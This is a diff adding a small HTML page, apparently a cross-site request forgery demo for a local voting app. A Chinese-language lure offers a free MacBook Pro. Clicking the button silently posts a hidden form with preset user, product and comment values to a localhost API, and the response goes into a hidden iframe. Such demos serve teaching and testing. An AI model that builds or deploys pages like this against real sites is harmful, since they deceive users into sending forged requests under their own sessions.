@@ -1,0 +1,15 @@
+﻿
+    <h1 style="font-size: 1.7em;">想要贏得 MacBook Pro 嗎？當然可以！單擊下面的按鈕，這是您的！！！</h1>
+
+    <form action="http://localhost:44375/api/vote" method="POST" target="hiddenFrame">
+        <input type="hidden" name="userID" value="2" />
+        <input type="hidden" name="productID" value="1" />
+        <input type="hidden" name="comments" value="MacBook Pro Hello!" />
+        <input type="submit" value="我想贏!" onclick="alert('你贏了! Click ok and it\'s done')" style="font-size: 2em;" />
+    </form>
+
+    <p>
+        <img src="/Images/macpro.jpg" style="width: 900px" />
+    </p>
+
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
